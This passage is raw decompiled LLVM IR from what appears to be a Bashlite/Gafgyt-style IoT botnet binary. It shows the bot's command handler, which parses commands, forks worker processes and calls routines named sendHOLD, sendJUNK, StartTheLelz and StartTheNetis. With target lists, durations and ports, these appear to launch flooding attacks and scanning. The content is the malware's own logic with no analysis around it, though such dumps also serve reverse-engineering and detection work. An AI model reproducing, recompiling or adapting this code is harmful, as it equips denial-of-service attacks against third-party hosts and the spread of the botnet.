dec_label_pc_8050024:                             ; preds = %dec_label_pc_804ffd9
  %v8_8050024 = icmp ult i32 %arg1, 2
  store i1 %v8_8050024, i1* %cf.global-to-local, align 1
  %v12_8050024 = icmp eq i32 %arg1, 2
  br i1 %v12_8050024, label %dec_label_pc_8050044, label %dec_label_pc_805002a

dec_label_pc_805002a:                             ; preds = %dec_label_pc_8050024
  %v0_805002a = load i8*, i8** @global_var_805e480.20, align 4
  %v1_805002a = ptrtoint i8* %v0_805002a to i32
  %v3_805003a = call i32 @HackerPrint(i32 %v1_805002a, i32 ptrtoint ([16 x i8]* @global_var_805b987.437 to i32))
  br label %dec_label_pc_8051255

dec_label_pc_8050044:                             ; preds = %dec_label_pc_8050024
  %v1_8050047 = add i32 %tmp217, 4
  %v5_8050047 = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_8050047, i1* %cf.global-to-local, align 1
  %v1_805004a = inttoptr i32 %v1_8050047 to i32*
  %v2_805004a = load i32, i32* %v1_805004a, align 4
  store i1 false, i1* @df, align 1
  %v4_8050067 = inttoptr i32 %v2_805004a to i8*
  store i32 %v2_805004a, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805b997.438 to i32), i32* @edi, align 4
  %v7_8050079 = call i32 @_strncmp(i8* %v4_8050067, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b997.438, i32 0, i32 0), i32 4)
  %v8_8050079 = urem i32 %v7_8050079, 2
  %v9_8050079 = icmp eq i32 %v8_8050079, 0
  %v0_805007b = load i1, i1* %cf.global-to-local, align 1
  %v2_805007b = or i1 %v0_805007b, %v9_8050079
  %v3_805007b = zext i1 %v2_805007b to i32
  %v4_805007b = load i32, i32* %edx.global-to-local, align 4
  %v5_805007b = and i32 %v4_805007b, -256
  %v6_805007b = or i32 %v3_805007b, %v5_805007b
  %v7_805007b = xor i32 %v6_805007b, 1
  store i32 %v7_805007b, i32* @edx, align 4
  %v1_8050083 = trunc i32 %v7_805007b to i8
  %v3_8050083 = zext i1 %v0_805007b to i8
  %v15_8050083 = icmp eq i8 %v1_8050083, %v3_8050083
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805008c = icmp eq i1 %v15_8050083, false
  br i1 %v1_805008c, label %dec_label_pc_80500cf, label %dec_label_pc_805008e

dec_label_pc_805008e:                             ; preds = %dec_label_pc_8050044
  %v0_805008e = load i32, i32* @global_var_8064710.439, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050093 = icmp eq i32 %v0_805008e, 0
  br i1 %v1_8050093, label %dec_label_pc_8051255, label %dec_label_pc_805009b

dec_label_pc_805009b:                             ; preds = %dec_label_pc_805008e
  %v3_80500ab = call i32 @kill(i32 %v0_805008e, i32 9)
  %v0_80500b0 = load i8*, i8** @global_var_805e480.20, align 4
  %v1_80500b0 = ptrtoint i8* %v0_80500b0 to i32
  %v3_80500c0 = call i32 @HackerPrint(i32 %v1_80500b0, i32 ptrtoint ([5 x i8]* @global_var_805b99b.440 to i32))
  store i32 0, i32* @global_var_8064710.439, align 16
  br label %dec_label_pc_80500cf

dec_label_pc_80500cf:                             ; preds = %dec_label_pc_8050044, %dec_label_pc_805009b
  store i1 %v5_8050047, i1* %cf.global-to-local, align 1
  %v2_80500d5 = load i32, i32* %v1_805004a, align 4
  store i1 false, i1* @df, align 1
  %v4_80500f2 = inttoptr i32 %v2_80500d5 to i8*
  %v7_8050104 = call i32 @_strncmp(i8* %v4_80500f2, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b9a0.441, i32 0, i32 0), i32 3)
  %v8_8050104 = urem i32 %v7_8050104, 2
  %v9_8050104 = icmp eq i32 %v8_8050104, 0
  %v0_8050106 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050106 = or i1 %v0_8050106, %v9_8050104
  %v3_8050106 = zext i1 %v2_8050106 to i32
  %v4_8050106 = load i32, i32* @edx, align 4
  %v5_8050106 = and i32 %v4_8050106, -256
  %v6_8050106 = or i32 %v3_8050106, %v5_8050106
  %v7_8050106 = xor i32 %v6_8050106, 1
  store i32 %v7_8050106, i32* %edx.global-to-local, align 4
  %v1_805010e = trunc i32 %v7_8050106 to i8
  %v3_805010e = zext i1 %v0_8050106 to i8
  %v15_805010e = icmp eq i8 %v1_805010e, %v3_805010e
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050117 = icmp eq i1 %v15_805010e, false
  br i1 %v1_8050117, label %dec_label_pc_8050168, label %dec_label_pc_8050119

dec_label_pc_8050119:                             ; preds = %dec_label_pc_80500cf
  %v0_8050119 = load i32, i32* @global_var_8064710.439, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805011e = icmp eq i32 %v0_8050119, 0
  %v1_8050120 = icmp eq i1 %v1_805011e, false
  br i1 %v1_8050120, label %dec_label_pc_8051255, label %dec_label_pc_8050126

dec_label_pc_8050126:                             ; preds = %dec_label_pc_8050119
  %v1_8050126 = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050131 = icmp eq i32 %v1_8050126, 0
  br i1 %v4_8050131, label %dec_label_pc_8050157, label %dec_label_pc_805013a

dec_label_pc_805013a:                             ; preds = %dec_label_pc_8050126
  store i32 %v1_8050126, i32* @global_var_8064710.439, align 16
  br label %dec_label_pc_8051255

dec_label_pc_8050157:                             ; preds = %dec_label_pc_8050126
  store i1 true, i1* %cf.global-to-local, align 1
  %v1_8050157 = call i32 @StartTheLelz(i32 0)
  %v2_8050163 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050168:                             ; preds = %dec_label_pc_80500cf, %dec_label_pc_804ffd9
  %v2_805016b = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_8050188 = inttoptr i32 %v2_805016b to i8*
  %v7_805019a = call i32 @_strncmp(i8* %v4_8050188, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b9a3.442, i32 0, i32 0), i32 6)
  %v8_805019a = urem i32 %v7_805019a, 2
  %v9_805019a = icmp eq i32 %v8_805019a, 0
  %v0_805019c = load i1, i1* %cf.global-to-local, align 1
  %v2_805019c = or i1 %v0_805019c, %v9_805019a
  %v3_805019c = zext i1 %v2_805019c to i32
  %v4_805019c = load i32, i32* %edx.global-to-local, align 4
  %v5_805019c = and i32 %v4_805019c, -256
  %v6_805019c = or i32 %v3_805019c, %v5_805019c
  %v7_805019c = xor i32 %v6_805019c, 1
  store i32 %v7_805019c, i32* %edx.global-to-local, align 4
  %v1_80501a4 = trunc i32 %v7_805019c to i8
  %v3_80501a4 = zext i1 %v0_805019c to i8
  %v4_80501a4 = sub nsw i8 %v1_80501a4, %v3_80501a4
  %v15_80501a4 = icmp eq i8 %v4_80501a4, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80501ad = icmp eq i1 %v15_80501a4, false
  br i1 %v1_80501ad, label %dec_label_pc_8050229, label %dec_label_pc_80501af

dec_label_pc_80501af:                             ; preds = %dec_label_pc_8050168
  %v2_80501a8 = sext i8 %v4_80501a4 to i32
  %v8_80501af = icmp ult i32 %arg1, 2
  store i1 %v8_80501af, i1* %cf.global-to-local, align 1
  %v12_80501af = icmp eq i32 %arg1, 2
  %v1_80501b3 = icmp eq i1 %v12_80501af, false
  br i1 %v1_80501b3, label %dec_label_pc_8051255, label %dec_label_pc_80501b9

dec_label_pc_80501b9:                             ; preds = %dec_label_pc_80501af
  %v1_80501bc = add i32 %tmp217, 4
  %v5_80501bc = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_80501bc, i1* %cf.global-to-local, align 1
  %v1_80501bf = inttoptr i32 %v1_80501bc to i32*
  %v2_80501bf = load i32, i32* %v1_80501bf, align 4
  store i1 false, i1* @df, align 1
  %v4_80501dc = inttoptr i32 %v2_80501bf to i8*
  store i32 %v2_80501bf, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_805b9a0.441 to i32), i32* @edi, align 4
  %v7_80501ee = call i32 @_strncmp(i8* %v4_80501dc, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b9a0.441, i32 0, i32 0), i32 3)
  %v8_80501ee = urem i32 %v7_80501ee, 2
  %v9_80501ee = icmp eq i32 %v8_80501ee, 0
  %v0_80501f0 = load i1, i1* %cf.global-to-local, align 1
  %v2_80501f0 = or i1 %v0_80501f0, %v9_80501ee
  %v3_80501f0 = zext i1 %v2_80501f0 to i32
  %v4_80501f0 = load i32, i32* %edx.global-to-local, align 4
  %v5_80501f0 = and i32 %v4_80501f0, -256
  %v6_80501f0 = or i32 %v3_80501f0, %v5_80501f0
  %v7_80501f0 = xor i32 %v6_80501f0, 1
  store i32 %v7_80501f0, i32* %edx.global-to-local, align 4
  %v1_80501f8 = trunc i32 %v7_80501f0 to i8
  %v3_80501f8 = zext i1 %v0_80501f0 to i8
  %v15_80501f8 = icmp eq i8 %v1_80501f8, %v3_80501f8
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050201 = icmp eq i1 %v15_80501f8, false
  br i1 %v1_8050201, label %dec_label_pc_8050229, label %dec_label_pc_8050203

dec_label_pc_8050203:                             ; preds = %dec_label_pc_80501b9
  %v0_8050203 = load i8*, i8** @global_var_805e480.20, align 4
  %v1_8050203 = ptrtoint i8* %v0_8050203 to i32
  %v3_8050213 = call i32 @HackerPrint(i32 %v1_8050203, i32 ptrtoint ([25 x i8]* @global_var_805b9a9.443 to i32))
  %v0_8050218 = call i32 @StartTheNetis()
  %v2_8050224 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050229:                             ; preds = %dec_label_pc_80501b9, %dec_label_pc_8050168
  %v2_805022c = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_8050249 = inttoptr i32 %v2_805022c to i8*
  store i32 %v2_805022c, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805b9c2.444 to i32), i32* @edi, align 4
  %v7_805025b = call i32 @_strncmp(i8* %v4_8050249, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b9c2.444, i32 0, i32 0), i32 5)
  %v8_805025b = urem i32 %v7_805025b, 2
  %v9_805025b = icmp eq i32 %v8_805025b, 0
  %v0_805025d = load i1, i1* %cf.global-to-local, align 1
  %v2_805025d = or i1 %v0_805025d, %v9_805025b
  %v3_805025d = zext i1 %v2_805025d to i32
  %v4_805025d = load i32, i32* %edx.global-to-local, align 4
  %v5_805025d = and i32 %v4_805025d, -256
  %v6_805025d = or i32 %v3_805025d, %v5_805025d
  %v7_805025d = xor i32 %v6_805025d, 1
  store i32 %v7_805025d, i32* @edx, align 4
  %v1_8050265 = trunc i32 %v7_805025d to i8
  %v3_8050265 = zext i1 %v0_805025d to i8
  %v4_8050265 = sub nsw i8 %v1_8050265, %v3_8050265
  %v15_8050265 = icmp eq i8 %v4_8050265, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805026e = icmp eq i1 %v15_8050265, false
  br i1 %v1_805026e, label %dec_label_pc_80503b8, label %dec_label_pc_8050274

dec_label_pc_8050274:                             ; preds = %dec_label_pc_8050229
  %v2_8050269 = sext i8 %v4_8050265 to i32
  %v9_8050274 = icmp ult i32 %arg1, 3
  store i1 %v9_8050274, i1* %cf.global-to-local, align 1
  %v7_8050278 = icmp sgt i32 %arg1, 3
  br i1 %v7_8050278, label %dec_label_pc_805027e, label %dec_label_pc_8051255

dec_label_pc_805027e:                             ; preds = %dec_label_pc_8050274
  %v1_8050281 = add i32 %tmp217, 8
  %v5_8050281 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_8050281, i1* %cf.global-to-local, align 1
  %v1_8050284 = inttoptr i32 %v1_8050281 to i32*
  %v2_8050284 = load i32, i32* %v1_8050284, align 4
  %v2_8050289 = call i32 @atol(i32 %v2_8050284)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp224 = icmp slt i32 %v2_8050289, 1
  br i1 %tmp224, label %dec_label_pc_8051255, label %dec_label_pc_8050296

dec_label_pc_8050296:                             ; preds = %dec_label_pc_805027e
  %v1_8050299 = add i32 %tmp217, 12
  %v5_8050299 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_8050299, i1* %cf.global-to-local, align 1
  %v1_805029c = inttoptr i32 %v1_8050299 to i32*
  %v2_805029c = load i32, i32* %v1_805029c, align 4
  %v2_80502a1 = call i32 @atol(i32 %v2_805029c)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp225 = icmp slt i32 %v2_80502a1, 1
  %tmp226 = icmp eq i1 %tmp225, false
  br i1 %tmp226, label %dec_label_pc_80502af, label %dec_label_pc_8051255

dec_label_pc_80502af:                             ; preds = %dec_label_pc_8050296
  %v1_80502b2 = add i32 %tmp217, 4
  %v1_80502b5 = inttoptr i32 %v1_80502b2 to i32*
  %v2_80502b5 = load i32, i32* %v1_80502b5, align 4
  store i1 %v5_8050281, i1* %cf.global-to-local, align 1
  %v2_80502c3 = load i32, i32* %v1_8050284, align 4
  %v2_80502c8 = call i32 @atol(i32 %v2_80502c3)
  store i1 %v5_8050299, i1* %cf.global-to-local, align 1
  %v2_80502d9 = load i32, i32* %v1_805029c, align 4
  %v2_80502de = call i32 @atol(i32 %v2_80502d9)
  %v4_80502f7 = inttoptr i32 %v2_80502b5 to i8*
  %v4_80502fa = call i32 @__GI_strchr(i8* %v4_80502f7, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80502ff = icmp eq i32 %v4_80502fa, 0
  br i1 %v1_80502ff, label %dec_label_pc_805037d, label %dec_label_pc_8050303

dec_label_pc_8050303:                             ; preds = %dec_label_pc_80502af
  store i32 %v2_80502b5, i32* @eax, align 4
  %v3_8050314 = call i32 @__GI_strtok(i32 %v2_80502b5, i32 ptrtoint (i32* @global_var_805b911.422 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805037289 = icmp eq i32 %v3_8050314, 0
  %v1_805037996 = icmp eq i1 %v4_805037289, false
  br i1 %v1_805037996, label %dec_label_pc_8050321, label %dec_label_pc_80503b8

dec_label_pc_8050321:                             ; preds = %dec_label_pc_8050303, %dec_label_pc_8050358
  %storemerge1297 = phi i32 [ %v3_8050367, %dec_label_pc_8050358 ], [ %v3_8050314, %dec_label_pc_8050303 ]
  %v0_8050321 = call i32 @listFork()
  store i32 %v0_8050321, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050326 = icmp eq i32 %v0_8050321, 0
  %v1_8050328 = icmp eq i1 %v1_8050326, false
  br i1 %v1_8050328, label %dec_label_pc_8050358, label %dec_label_pc_805032a

dec_label_pc_805032a:                             ; preds = %dec_label_pc_8050321
  %v4_8050347 = call i32 @sendHOLD(i32 %storemerge1297, i32 %v2_80502c8, i32 %v2_80502de)
  %v2_8050353 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050358:                             ; preds = %dec_label_pc_8050321
  %v3_8050367 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805b911.422 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050372 = icmp eq i32 %v3_8050367, 0
  %v1_8050379 = icmp eq i1 %v4_8050372, false
  br i1 %v1_8050379, label %dec_label_pc_8050321, label %dec_label_pc_80503b8

dec_label_pc_805037d:                             ; preds = %dec_label_pc_80502af
  %v0_805037d = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050382 = icmp eq i32 %v0_805037d, 0
  %v1_8050384 = icmp eq i1 %v1_8050382, false
  br i1 %v1_8050384, label %dec_label_pc_8051255, label %dec_label_pc_805038a

dec_label_pc_805038a:                             ; preds = %dec_label_pc_805037d
  %v4_80503a7 = call i32 @sendHOLD(i32 %v2_80502b5, i32 %v2_80502c8, i32 %v2_80502de)
  %v2_80503b3 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80503b8:                             ; preds = %dec_label_pc_8050358, %dec_label_pc_8050303, %dec_label_pc_8050229
  %v2_80503bb = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_80503d8 = inttoptr i32 %v2_80503bb to i8*
  store i32 %v2_80503bb, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805b9c7.445 to i32), i32* @edi, align 4
  %v7_80503ea = call i32 @_strncmp(i8* %v4_80503d8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b9c7.445, i32 0, i32 0), i32 5)
  %v8_80503ea = urem i32 %v7_80503ea, 2
  %v9_80503ea = icmp eq i32 %v8_80503ea, 0
  %v0_80503ec = load i1, i1* %cf.global-to-local, align 1
  %v2_80503ec = or i1 %v0_80503ec, %v9_80503ea
  %v3_80503ec = zext i1 %v2_80503ec to i32
  %v4_80503ec = load i32, i32* @edx, align 4
  %v5_80503ec = and i32 %v4_80503ec, -256
  %v6_80503ec = or i32 %v3_80503ec, %v5_80503ec
  %v7_80503ec = xor i32 %v6_80503ec, 1
  store i32 %v7_80503ec, i32* @edx, align 4
  %v1_80503f4 = trunc i32 %v7_80503ec to i8
  %v3_80503f4 = zext i1 %v0_80503ec to i8
  %v4_80503f4 = sub nsw i8 %v1_80503f4, %v3_80503f4
  %v15_80503f4 = icmp eq i8 %v4_80503f4, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80503fd = icmp eq i1 %v15_80503f4, false
  br i1 %v1_80503fd, label %dec_label_pc_8050558, label %dec_label_pc_8050403

dec_label_pc_8050403:                             ; preds = %dec_label_pc_80503b8
  %v2_80503f8 = sext i8 %v4_80503f4 to i32
  %v9_8050403 = icmp ult i32 %arg1, 3
  store i1 %v9_8050403, i1* %cf.global-to-local, align 1
  %v7_8050407 = icmp sgt i32 %arg1, 3
  br i1 %v7_8050407, label %dec_label_pc_805040d, label %dec_label_pc_8051255

dec_label_pc_805040d:                             ; preds = %dec_label_pc_8050403
  %v1_8050410 = add i32 %tmp217, 8
  %v5_8050410 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_8050410, i1* %cf.global-to-local, align 1
  %v1_8050413 = inttoptr i32 %v1_8050410 to i32*
  %v2_8050413 = load i32, i32* %v1_8050413, align 4
  %v2_8050418 = call i32 @atol(i32 %v2_8050413)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp227 = icmp slt i32 %v2_8050418, 1
  br i1 %tmp227, label %dec_label_pc_8051255, label %dec_label_pc_8050425

dec_label_pc_8050425:                             ; preds = %dec_label_pc_805040d
  %v1_8050428 = add i32 %tmp217, 12
  %v5_8050428 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_8050428, i1* %cf.global-to-local, align 1
  %v1_805042b = inttoptr i32 %v1_8050428 to i32*
  %v2_805042b = load i32, i32* %v1_805042b, align 4
  %v2_8050430 = call i32 @atol(i32 %v2_805042b)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp228 = icmp slt i32 %v2_8050430, 1
  %tmp229 = icmp eq i1 %tmp228, false
  br i1 %tmp229, label %dec_label_pc_805043e, label %dec_label_pc_8051255

dec_label_pc_805043e:                             ; preds = %dec_label_pc_8050425
  %v1_8050441 = add i32 %tmp217, 4
  %v1_8050444 = inttoptr i32 %v1_8050441 to i32*
  %v2_8050444 = load i32, i32* %v1_8050444, align 4
  store i1 %v5_8050410, i1* %cf.global-to-local, align 1
  %v2_8050452 = load i32, i32* %v1_8050413, align 4
  %v2_8050457 = call i32 @atol(i32 %v2_8050452)
  store i1 %v5_8050428, i1* %cf.global-to-local, align 1
  %v2_8050468 = load i32, i32* %v1_805042b, align 4
  %v2_805046d = call i32 @atol(i32 %v2_8050468)
  %v4_8050486 = inttoptr i32 %v2_8050444 to i8*
  %v4_8050489 = call i32 @__GI_strchr(i8* %v4_8050486, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805048e = icmp eq i32 %v4_8050489, 0
  br i1 %v1_805048e, label %dec_label_pc_805051d, label %dec_label_pc_8050496

dec_label_pc_8050496:                             ; preds = %dec_label_pc_805043e
  store i32 %v2_8050444, i32* @eax, align 4
  %v3_80504a7 = call i32 @__GI_strtok(i32 %v2_8050444, i32 ptrtoint (i32* @global_var_805b911.422 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805051280 = icmp eq i32 %v3_80504a7, 0
  %v1_805051987 = icmp eq i1 %v4_805051280, false
  br i1 %v1_805051987, label %dec_label_pc_80504b4, label %dec_label_pc_8050558

dec_label_pc_80504b4:                             ; preds = %dec_label_pc_8050496, %dec_label_pc_80504f8
  %storemerge1388 = phi i32 [ %v3_8050507, %dec_label_pc_80504f8 ], [ %v3_80504a7, %dec_label_pc_8050496 ]
  %v0_80504b4 = call i32 @listFork()
  store i32 %v0_80504b4, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80504b9 = icmp eq i32 %v0_80504b4, 0
  %v1_80504bb = icmp eq i1 %v1_80504b9, false
  br i1 %v1_80504bb, label %dec_label_pc_80504f8, label %dec_label_pc_80504bd

dec_label_pc_80504bd:                             ; preds = %dec_label_pc_80504b4
  %v4_80504da = call i32 @sendJUNK(i32 %storemerge1388, i32 %v2_8050457, i32 %v2_805046d)
  %v0_80504df = load i8*, i8** @global_var_805e480.20, align 4
  %v1_80504df = ptrtoint i8* %v0_80504df to i32
  %v2_80504e7 = call i32 @__libc_close(i32 %v1_80504df)
  %v2_80504f3 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80504f8:                             ; preds = %dec_label_pc_80504b4
  %v3_8050507 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805b911.422 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050512 = icmp eq i32 %v3_8050507, 0
  %v1_8050519 = icmp eq i1 %v4_8050512, false
  br i1 %v1_8050519, label %dec_label_pc_80504b4, label %dec_label_pc_8050558

dec_label_pc_805051d:                             ; preds = %dec_label_pc_805043e
  %v0_805051d = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050522 = icmp eq i32 %v0_805051d, 0
  %v1_8050524 = icmp eq i1 %v1_8050522, false
  br i1 %v1_8050524, label %dec_label_pc_8051255, label %dec_label_pc_805052a

dec_label_pc_805052a:                             ; preds = %dec_label_pc_805051d
  %v4_8050547 = call i32 @sendJUNK(i32 %v2_8050444, i32 %v2_8050457, i32 %v2_805046d)
  %v2_8050553 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050558:                             ; preds = %dec_label_pc_80504f8, %dec_label_pc_8050496, %dec_label_pc_80503b8
  %v2_805055b = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_8050578 = inttoptr i32 %v2_805055b to i8*
  store i32 ptrtoint ([4 x i8]* @global_var_805b9cc.446 to i32), i32* @edi, align 4
  %v7_805058a = call i32 @_strncmp(i8* %v4_8050578, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b9cc.446, i32 0, i32 0), i32 4)
  %v8_805058a = urem i32 %v7_805058a, 2
  %v9_805058a = icmp eq i32 %v8_805058a, 0
  %v0_805058c = load i1, i1* %cf.global-to-local, align 1
  %v2_805058c = or i1 %v0_805058c, %v9_805058a
  %v3_805058c = zext i1 %v2_805058c to i32
  %v4_805058c = load i32, i32* @edx, align 4
  %v5_805058c = and i32 %v4_805058c, -256
  %v6_805058c = or i32 %v3_805058c, %v5_805058c
  %v7_805058c = xor i32 %v6_805058c, 1
  store i32 %v7_805058c, i32* @edx, align 4
  %v1_8050594 = trunc i32 %v7_805058c to i8
  %v3_8050594 = zext i1 %v0_805058c to i8
  %v4_8050594 = sub nsw i8 %v1_8050594, %v3_8050594
  %v15_8050594 = icmp eq i8 %v4_8050594, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805059d = icmp eq i1 %v15_8050594, false
  br i1 %v1_805059d, label %dec_label_pc_80507dd, label %dec_label_pc_80505a3

dec_label_pc_80505a3:                             ; preds = %dec_label_pc_8050558
  %v2_8050598 = sext i8 %v4_8050594 to i32
  %v9_80505a3 = icmp ult i32 %arg1, 5
  store i1 %v9_80505a3, i1* %cf.global-to-local, align 1
  %v7_80505a7 = icmp sgt i32 %arg1, 5
  br i1 %v7_80505a7, label %dec_label_pc_80505ad, label %dec_label_pc_8051255

dec_label_pc_80505ad:                             ; preds = %dec_label_pc_80505a3
  %v1_80505b0 = add i32 %tmp217, 12
  %v5_80505b0 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_80505b0, i1* %cf.global-to-local, align 1
  %v1_80505b3 = inttoptr i32 %v1_80505b0 to i32*
  %v2_80505b3 = load i32, i32* %v1_80505b3, align 4
  %v2_80505b8 = call i32 @atol(i32 %v2_80505b3)
  %v5_80505bd = icmp ne i32 %v2_80505b8, -1
  store i1 %v5_80505bd, i1* %cf.global-to-local, align 1
  %v10_80505bd = icmp eq i32 %v2_80505b8, -1
  br i1 %v10_80505bd, label %dec_label_pc_8051255, label %dec_label_pc_80505c6

dec_label_pc_80505c6:                             ; preds = %dec_label_pc_80505ad
  %v1_80505c9 = add i32 %tmp217, 8
  %v5_80505c9 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_80505c9, i1* %cf.global-to-local, align 1
  %v1_80505cc = inttoptr i32 %v1_80505c9 to i32*
  %v2_80505cc = load i32, i32* %v1_80505cc, align 4
  %v2_80505d1 = call i32 @atol(i32 %v2_80505cc)
  %v5_80505d6 = icmp ne i32 %v2_80505d1, -1
  store i1 %v5_80505d6, i1* %cf.global-to-local, align 1
  %v10_80505d6 = icmp eq i32 %v2_80505d1, -1
  br i1 %v10_80505d6, label %dec_label_pc_8051255, label %dec_label_pc_80505df

dec_label_pc_80505df:                             ; preds = %dec_label_pc_80505c6
  %v1_80505e2 = add i32 %tmp217, 16
  %v2_80505e2 = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_80505e2, i1* %cf.global-to-local, align 1
  %v1_80505e5 = inttoptr i32 %v1_80505e2 to i32*
  %v2_80505e5 = load i32, i32* %v1_80505e5, align 4
  %v2_80505ea = call i32 @atol(i32 %v2_80505e5)
  %v5_80505ef = icmp ne i32 %v2_80505ea, -1
  store i1 %v5_80505ef, i1* %cf.global-to-local, align 1
  %v10_80505ef = icmp eq i32 %v2_80505ea, -1
  br i1 %v10_80505ef, label %dec_label_pc_8051255, label %dec_label_pc_80505f8

dec_label_pc_80505f8:                             ; preds = %dec_label_pc_80505df
  %v1_80505fb = add i32 %tmp217, 20
  %v5_80505fb = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_80505fb, i1* %cf.global-to-local, align 1
  %v1_80505fe = inttoptr i32 %v1_80505fb to i32*
  %v2_80505fe = load i32, i32* %v1_80505fe, align 4
  %v2_8050603 = call i32 @atol(i32 %v2_80505fe)
  %v5_8050608 = icmp ne i32 %v2_8050603, -1
  store i1 %v5_8050608, i1* %cf.global-to-local, align 1
  %v10_8050608 = icmp eq i32 %v2_8050603, -1
  br i1 %v10_8050608, label %dec_label_pc_8051255, label %dec_label_pc_8050611

dec_label_pc_8050611:                             ; preds = %dec_label_pc_80505f8
  store i1 %v5_80505fb, i1* %cf.global-to-local, align 1
  %v2_8050617 = load i32, i32* %v1_80505fe, align 4
  %v2_805061c = call i32 @atol(i32 %v2_8050617)
  %v1_8050621 = add i32 %v2_805061c, -65500
  %v5_8050621 = icmp ult i32 %v2_805061c, 65500
  %v6_8050621 = sub i32 65499, %v2_805061c
  %v7_8050621 = and i32 %v6_8050621, %v2_805061c
  %v8_8050621 = icmp slt i32 %v7_8050621, 0
  store i1 %v5_8050621, i1* %cf.global-to-local, align 1
  %v9_8050621 = icmp eq i32 %v1_8050621, 0
  %v10_8050621 = icmp slt i32 %v1_8050621, 0
  %v3_8050626 = icmp eq i1 %v10_8050621, %v8_8050621
  %v4_8050626 = icmp eq i1 %v9_8050621, false
  %v5_8050626 = and i1 %v4_8050626, %v3_8050626
  br i1 %v5_8050626, label %dec_label_pc_8051255, label %dec_label_pc_805062c

dec_label_pc_805062c:                             ; preds = %dec_label_pc_8050611
  store i1 %v2_80505e2, i1* %cf.global-to-local, align 1
  %v2_8050632 = load i32, i32* %v1_80505e5, align 4
  %v2_8050637 = call i32 @atol(i32 %v2_8050632)
  %v1_805063c = add i32 %v2_8050637, -32
  %v2_805063c = icmp ult i32 %v2_8050637, 32
  %v3_805063c = sub i32 31, %v2_8050637
  %v4_805063c = and i32 %v3_805063c, %v2_8050637
  %v5_805063c = icmp slt i32 %v4_805063c, 0
  store i1 %v2_805063c, i1* %cf.global-to-local, align 1
  %v6_805063c = icmp eq i32 %v1_805063c, 0
  %v7_805063c = icmp slt i32 %v1_805063c, 0
  %v3_805063f = icmp eq i1 %v7_805063c, %v5_805063c
  %v4_805063f = icmp eq i1 %v6_805063c, false
  %v5_805063f = and i1 %v4_805063f, %v3_805063f
  br i1 %v5_805063f, label %dec_label_pc_8051255, label %dec_label_pc_8050645

dec_label_pc_8050645:                             ; preds = %dec_label_pc_805062c
  %v8_8050645 = icmp ult i32 %arg1, 7
  store i1 %v8_8050645, i1* %cf.global-to-local, align 1
  %v12_8050645 = icmp eq i32 %arg1, 7
  %v1_8050649 = icmp eq i1 %v12_8050645, false
  br i1 %v1_8050649, label %dec_label_pc_8050664, label %dec_label_pc_805064b

dec_label_pc_805064b:                             ; preds = %dec_label_pc_8050645
  %v1_805064e = add i32 %tmp217, 24
  %v5_805064e = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
